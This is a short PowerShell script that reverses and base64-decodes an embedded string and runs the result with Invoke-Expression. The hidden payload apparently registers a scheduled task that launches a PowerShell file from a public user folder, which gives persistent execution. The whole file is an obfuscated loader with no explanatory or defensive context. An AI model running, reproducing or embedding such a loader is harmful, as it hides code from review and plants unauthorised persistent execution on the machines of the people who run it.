$best64code = "rNXY0RCI0NWZqJ2T0VHculULgMXZ0FGZwVVZulGd19mU5xWahREdm92cvJ3Yp1EIrNXYURWZsVHZlh2YT1iclR3cpdWZSpQDzdmbpRHdlNHJgM3ZulGd0V2UtAicld2ZpJHdkAicld2ZpJHVtACbhBXaj5WayBHJgwWYwl2YulmcQ1CIu9Wa0NWYkAibvlGdjFULgs2chRFZlxWdkVGajNVL3VmTg0DIrNXY0RiCNASV0MFIlBXeU52bn9GTtAiclNXdkACZJJXZzVVLgwWYwl2YulmcQt2chRFZlxWdkVGajNVL3VmTg0DIsFGcpNmbpJHckoQDl1WYO5SKoQnblJnc1NEdldkO60Ve0lGduVGZJN3dvRmbpdlLsFGcpNmbpJHUukHdpJXdjV2Uu0WZ0NXeTtFI9AiclNXdkoQD0V2UzdmbpRHdlN1azFGVkVGb1RWZoN2UtcXZOBSPgM3ZulGd0V2ckoQDwVFdyFGdTRXQtAicld2ZpJHVrNXYURWZsVHZlh2YT1ydl5EI9Aicld2ZpJHdkoQDnISMzBnLt92Yklmdux1ckF2bs52dvREXjlGbiVHUcNnclNXVcpzQiASZslmRtAybn9GTv5ULgUmdpR3YhJXZ05WSu9mTtcCI05WZtV3ZyFULgcSZ4VmLsxWZoNncld3bwdCIlRXdjVGeF1CIu9Wa0NWQrNXYURWZsVHZlh2YT1ydl5EI9AibvlGdjFGJ"
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
Invoke-Expression $LoadCode
